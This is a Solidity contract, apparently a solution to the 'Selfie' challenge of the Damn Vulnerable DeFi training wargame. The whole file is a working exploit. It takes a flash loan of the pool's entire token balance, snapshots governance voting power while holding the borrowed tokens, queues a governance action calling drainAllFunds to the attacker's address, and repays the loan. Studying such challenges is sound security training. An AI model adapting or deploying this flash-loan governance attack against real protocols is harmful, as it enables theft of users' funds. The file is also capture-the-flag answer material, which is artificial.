// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title Attack for DeFi
 * @author CP3cO / Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;

    function drainAllFunds(address receiver) external;
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external;

    function getActionDelay() external returns (uint256);
}

interface IDamnValuableTokenSnapshot {
    function snapshot() external returns (uint256);
}

contract Attack006_Selfie {
    using Address for address;
    address immutable governance;
    address immutable owner;
    address immutable flashloanPool;
    address immutable token;

    uint256 public actionId = 0;

    constructor(
        address _owner,
        address _targetPool,
        address _flashLoanPool,
        address _token
    ) {
        governance = _targetPool;
        owner = _owner;
        flashloanPool = _flashLoanPool;
        token = _token;
    }

    function attack() external {
        uint256 amount = IERC20(token).balanceOf(address(flashloanPool));
        IFlashLoanerPool(flashloanPool).flashLoan(amount);
    }

    function receiveTokens(address _token, uint256 _amount) external payable {
        IDamnValuableTokenSnapshot(_token).snapshot();
        actionId = ISimpleGovernance(governance).queueAction(
            flashloanPool,
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
        IERC20(_token).transfer(msg.sender, _amount);
    }
}
